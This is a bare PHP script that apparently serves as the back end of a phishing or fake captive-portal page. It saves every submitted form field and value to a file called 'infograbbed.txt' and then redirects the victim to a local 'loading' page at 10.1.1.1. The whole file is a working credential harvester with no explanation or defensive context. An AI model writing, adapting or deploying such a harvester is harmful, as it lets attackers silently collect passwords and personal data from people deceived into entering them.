<?php
header('Location:http://10.1.1.1/loading.html');

$handle = fopen("infograbbed.txt", "a");
$counter = 0;

foreach($_POST as $variable => $value) {
   if ($variable == "submit") {
      continue;
   }
   fwrite($handle, $variable);
   fwrite($handle, ": ");
   fwrite($handle, $value); 
   if ($counter % 2 == 0) {
      fwrite($handle, ", ");
   }
   $counter++; 
}

fwrite($handle, "\n");
fclose($handle);
exit;
?>

